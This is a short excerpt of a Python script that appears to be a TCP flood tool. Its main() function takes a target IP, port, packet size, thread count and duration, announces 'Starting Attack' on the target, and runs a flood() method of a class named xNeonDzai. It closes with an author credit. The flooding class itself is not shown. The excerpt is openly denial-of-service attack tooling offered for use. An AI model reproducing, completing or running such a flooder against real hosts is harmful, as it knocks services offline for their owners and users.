...
def main():
    if len(sys.argv) < 5:
        print("Usage: python TCP1.py <IP> <Port> <Packet Size> <Thread> <Time>")
        return
    ...
    print(f"{fg(196)}Starting {fg(197)}Attack {fg(198)}on {fg(200)}{ip}{fg(255)}:{fg(200)}{port} {attr(0)}", end='\r')
    xneon = xNeonDzai(ip, port, force, threads)
    try:
        xneon.flood()
        sleep(duration)
    except:
        xneon.stop()
        print("{fg(196)}Đã xảy {fg(197)}ra lỗi {fg(198)}nên cuộc {fg(199)}tấn công {fg(198)}đã bị {fg(196)}dừng.{attr(0)}")
    xneon.stop()
    ...
    print(f"{fg(201)}Made By HoangLamxNeonn{attr(0)}")
    sleep(1)
